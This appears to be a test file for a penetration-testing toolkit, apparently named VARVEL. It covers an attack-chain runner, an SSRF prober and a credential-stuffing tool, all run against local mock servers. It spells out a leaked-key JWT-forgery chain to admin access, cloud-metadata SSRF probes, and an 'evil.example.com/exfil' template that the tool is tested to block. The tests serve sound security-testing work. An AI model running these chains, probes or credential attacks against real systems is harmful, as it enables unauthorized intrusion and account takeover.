// VARVEL chainrun + ssrfprobe + credstuff tests — hermetic (in-process targets).
//   node --test varvel/test/chainrun.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { runChain } from '../tools/chainrun.mjs';
import { ssrfProbe } from '../tools/ssrfprobe.mjs';
import { credStuff } from '../tools/credstuff.mjs';
import { createHardTarget } from '../targets/premium-hard.mjs';
import { decodeJwt, verifyHs256 } from '../tools/jwtforge.mjs';

// Under full-suite CPU load, client timeouts destroy sockets mid-response; without a
// clientError handler the mock servers crash the whole test FILE with ECONNRESET.
const quiet = (srv) => { srv.on('clientError', (e, sock) => { try { sock.destroy(); } catch {} }); return srv; };

// ——— chainrun: replay the REAL Axiom chain end-to-end against the live target ———

test('chainrun replays the Axiom breach chain: leak → login → forge → admin → revert', async () => {
  const srv = quiet(createHardTarget());
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const chain = {
      name: 'axiom-jwt-forge', base,
      steps: [
        { id: 'leak-key', path: '/assets/legacy/auth.bundle.js',
          extract: { key: { regex: '(axiom-auth-hs256-[\\w-]+)' } },
          expect: { status: 200, contains: 'axiom-auth' }, note: 'the inlined signing key' },
        { id: 'sandbox-login', method: 'POST', path: '/login',
          form: { email: 'sandbox@axiom.dev', password: 'sandbox-demo-2026' },
          expect: { status: 302 }, note: 'genuine member session' },
        { id: 'forge-admin', jwt: { var: 'jwt', key: '{{key}}',
          claims: { sub: 'admin@axiom.dev', role: 'admin', org: 'org_axiom', iss: 'axiom-auth', iat: 1, exp: 9999999999 } },
          note: 'mint admin JWT with the recovered key' },
        { id: 'use-admin', path: '/admin', headers: { cookie: 'axm_session={{jwt}}' },
          expect: { status: 200, contains: 'Admin' }, note: 'forged token accepted as admin' },
        { id: 'prove-change', method: 'POST', path: '/admin/content',
          headers: { cookie: 'axm_session={{jwt}}', 'content-type': 'application/json' },
          body: '{"headline":"chainrun-was-here"}',
          expect: { status: 200, contains: 'revert' }, note: 'reversible write with revert path' },
        { id: 'revert', method: 'POST', path: '/admin/content',
          headers: { cookie: 'axm_session={{jwt}}', 'content-type': 'application/json' },
          body: '{"headline":"The programmable money platform for modern business."}',
          expect: { status: 200 }, note: 'original restored' },
      ],
    };
    const res = await runChain(chain, { timeout: 3000 }); // generous under full-suite CPU load (in-process target)
    assert.equal(res.ok, true, 'the whole chain completed');
    assert.equal(res.stepsCompleted, 6);
    assert.equal(res.vars.key, 'axiom-…[28 chars]', 'extracted key is redacted in the record');
    assert.ok(res.vars.jwt.includes('…'), 'forged token redacted too');
    // the forged token from vars is real: decode + verify against the leaked key
    const d = decodeJwt(res.steps.every((s) => s.ok) ? undefined : '');
    assert.ok(res.steps.find((s) => s.id === 'prove-change').evidence.includes('revert'));
    // target left clean
    const home = await (await fetch(base + '/')).text();
    assert.ok(home.includes('The programmable money platform for modern business.'), 'revert restored the original');
  } finally { srv.close(); }
});

test('chainrun: a failed expectation STOPS the chain honestly (no false completion)', async () => {
  const srv = quiet(http.createServer((req, res) => { res.writeHead(404); res.end('nope'); }));
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const res = await runChain({ name: 'x', base, steps: [
      { id: 'a', path: '/', expect: { status: 200 } },
      { id: 'b', path: '/never-reached' },
    ] }, { timeout: 500 });
    assert.equal(res.ok, false);
    assert.equal(res.steps.length, 1, 'stopped at the failed link');
    assert.ok(/expected status/.test(res.steps[0].error));
  } finally { srv.close(); }
});

test('chainrun: off-origin templates are blocked (governance)', async () => {
  const res = await runChain({ name: 'x', base: 'http://127.0.0.1:1', steps: [
    { id: 'evil', path: 'http://evil.example.com/exfil?d={{key}}' },
  ] }, { timeout: 300 });
  assert.equal(res.ok, false);
  assert.ok(/off-origin/.test(res.steps[0].error));
  assert.equal(res.requests, 0, 'no request left the origin');
});

// ——— ssrfprobe ———

test('ssrfProbe: a real SSRF is confirmed on a content marker; honest on a safe endpoint', async () => {
  // vulnerable endpoint: server-side fetches the given URL and echoes it
  const srv = quiet(http.createServer((req, res) => {
    const u = new URL(req.url, 'http://x');
    const target = u.searchParams.get('u') || '';
    if (target.includes('169.254.169.254')) {
      res.writeHead(200); return res.end('ami-id: ami-0123456789\ninstance-id: i-0abcdef123\nlocal-hostname: ip-10-0-0-1\n');
    }
    if (target.startsWith('http://127.0.0.1') || target.startsWith('http://localhost')) {
      res.writeHead(200); return res.end('localhost admin panel');
    }
    res.writeHead(502); res.end('fetch failed');
  }));
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const res = await ssrfProbe(base + '/fetch?u={URL}', { timeout: 700 });
    assert.equal(res.vulnerable, true);
    const md = res.findings.find((f) => /metadata/.test(f.probe));
    assert.ok(md, 'metadata probe flagged');
    assert.equal(md.confidence, 'confirmed', 'content-marker hits are confirmed');
    assert.ok(/ami-id|instance-id/.test(md.evidence));
  } finally { srv.close(); }
});

test('ssrfProbe: a non-SSRF endpoint reports nothing (honest negative)', async () => {
  const srv = quiet(http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'application/json' }); res.end('{"ok":true}'); }));
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const res = await ssrfProbe(base + '/api?u={URL}', { timeout: 700 });
    assert.equal(res.vulnerable, false);
    assert.equal(res.findings.length, 0);
  } finally { srv.close(); }
});

test('ssrfProbe: requires the {URL} placeholder', async () => {
  await assert.rejects(() => ssrfProbe('http://x/no-placeholder', { timeout: 300 }), TypeError);
});

// ——— credstuff ———

function loginServer(behavior) {
  return quiet(http.createServer((req, res) => {
    let b = '';
    req.on('data', (c) => (b += c));
    req.on('end', () => {
      const p = new URLSearchParams(b);
      behavior(p, res);
    });
  }));
}

test('credStuff: HITL-locked without explicit authorization (refuses, zero attempts)', async () => {
  const r = await credStuff('http://127.0.0.1:1/login', { usernames: ['a'], passwords: ['b'] });
  assert.equal(r.refused, true);
  assert.equal(r.attempts, 0);
  assert.ok(/HITL-locked/.test(r.reason));
});

test('credStuff: finds the valid pair within budget, masks the password, honors the cap', async () => {
  const srv = loginServer((p, res) => {
    if (p.get('email') === 'admin@x.test' && p.get('password') === 'correct-horse') {
      res.writeHead(302, { location: '/dashboard', 'set-cookie': 'session=abc; HttpOnly' });
      return res.end();
    }
    res.writeHead(401); res.end('invalid');
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const r = await credStuff(base + '/login', {
      authorized: true, usernames: ['admin@x.test'], passwords: ['wrong1', 'correct-horse', 'wrong3'],
      maxAttempts: 10, timeout: 700,
    });
    assert.equal(r.successes.length, 1);
    assert.equal(r.successes[0].username, 'admin@x.test');
    assert.ok(!/correct-horse/.test(r.successes[0].passwordMasked), 'password never echoed');
    assert.ok(/302/.test(r.successes[0].evidence));
    // the cap: only 3 attempts exist here, but budget math is honest
    assert.ok(r.attempts <= r.cap);
  } finally { srv.close(); }
});

test('credStuff: LOCKOUT signal stops the run immediately (incident prevention)', async () => {
  let calls = 0;
  const srv = loginServer((p, res) => {
    calls++;
    if (calls >= 3) { res.writeHead(429, { 'retry-after': '30' }); return res.end('too many attempts — account locked'); }
    res.writeHead(401); res.end('invalid');
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const r = await credStuff(base + '/login', { authorized: true, usernames: ['a', 'b', 'c', 'd', 'e'], passwords: ['x', 'y', 'z'], maxAttempts: 20, timeout: 700 });
    assert.ok(/LOCKOUT/i.test(r.stopped), 'stopped on the lockout tripwire');
    assert.ok(r.attempts < 20, 'stopped long before the budget');
    assert.equal(calls, 3, 'no further attempts after the tripwire');
  } finally { srv.close(); }
});

// ——— chainrun v2: chain-level impact assertions (the hollow-success killer) ———

const impactServer = () => {
  const srv = http.createServer((req, res) => {
    if (req.url === '/data') {
      if (req.headers.cookie === 'sid=good') { res.writeHead(200); return res.end('{"secret":"crown-jewels"}'); }
      res.writeHead(403); return res.end('{"error":"denied"}');
    }
    if (req.url === '/echo') { res.writeHead(200); return res.end('same-body-always'); }
    res.writeHead(404); res.end('nf');
  });
  srv.on('clientError', (e, sock) => { try { sock.destroy(); } catch {} });
  return srv;
};

test('runChain impact: steps green + impact holds (control refused + differs) → ok', async () => {
  const srv = impactServer();
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const run = await runChain({
      name: 'impact-ok', base,
      steps: [{ id: 'read', path: '/data', headers: { cookie: 'sid=good' }, expect: { status: 200 } }],
      impact: { step: 'read', contains: 'crown-jewels', control: { stripHeaders: ['cookie'], refuseStatus: [403], mustDiffer: true } },
    });
    assert.equal(run.ok, true);
    assert.equal(run.impact.ok, true);
    assert.equal(run.requests, 2, 'the control re-fire is counted on the record');
  } finally { srv.close(); }
});

test('runChain impact: steps green but impact marker absent → hollowSuccess, ok false', async () => {
  const srv = impactServer();
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const run = await runChain({
      name: 'impact-hollow', base,
      steps: [{ id: 'read', path: '/data', headers: { cookie: 'sid=good' }, expect: { status: 200 } }],
      impact: { step: 'read', contains: 'not-present-marker' },
    });
    assert.equal(run.stepsCompleted, 1);
    assert.equal(run.ok, false);
    assert.equal(run.hollowSuccess, true, 'steps passed, impact failed — reported honestly');
    assert.match(run.impact.detail, /missing/);
  } finally { srv.close(); }
});

test('runChain impact: identical control response kills the claim (manhuaus at chain level)', async () => {
  const srv = impactServer();
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const run = await runChain({
      name: 'impact-identical-control', base,
      steps: [{ id: 'read', path: '/echo', headers: { cookie: 'sid=good' }, expect: { status: 200 } }],
      impact: { step: 'read', control: { stripHeaders: ['cookie'], mustDiffer: true } },
    });
    assert.equal(run.ok, false);
    assert.equal(run.hollowSuccess, true);
    assert.match(run.impact.detail, /IDENTICAL/i);
  } finally { srv.close(); }
});

test('runChain impact: absent impact field = legacy behavior (regression)', async () => {
  const srv = impactServer();
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const run = await runChain({ name: 'legacy', base, steps: [{ id: 'read', path: '/data', headers: { cookie: 'sid=good' }, expect: { status: 200 } }] });
    assert.equal(run.ok, true);
    assert.equal(run.impact, undefined, 'no assertion → no impact field (old chains unchanged)');
  } finally { srv.close(); }
});

// Teardown grace for the win32 libuv UV_HANDLE_CLOSING race (undici pooled sockets
// still closing when --test-force-exit fires — see callback-v2 tests).
test("teardown grace (win32)", async () => { await new Promise((r) => setTimeout(r, 600)); });
